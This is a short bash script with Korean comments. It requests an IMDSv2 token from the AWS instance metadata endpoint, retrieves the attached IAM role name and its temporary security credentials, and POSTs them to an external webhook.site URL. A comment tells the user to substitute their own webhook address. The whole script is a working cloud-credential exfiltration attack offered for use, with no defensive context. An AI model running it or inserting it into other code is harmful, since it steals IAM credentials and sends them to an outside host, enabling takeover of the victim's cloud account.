#!/bin/bash

# 1. IMDSv2 토큰 요청
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# 2. IAM Role 이름 가져오기
ROLE_NAME=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# 3. 자격 증명 가져오기
CREDS=$(curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)

# 4. Webhook.site로 전송 (여기 링크는 본인 주소로 바꿔야 함)
curl -s -X POST -H "Content-Type: application/json" \
  -d "{\"role\":\"$ROLE_NAME\", \"creds\":$CREDS}" \
  https://webhook.site/13d3d91f-1575-49cc-9843-60e8260b7a99
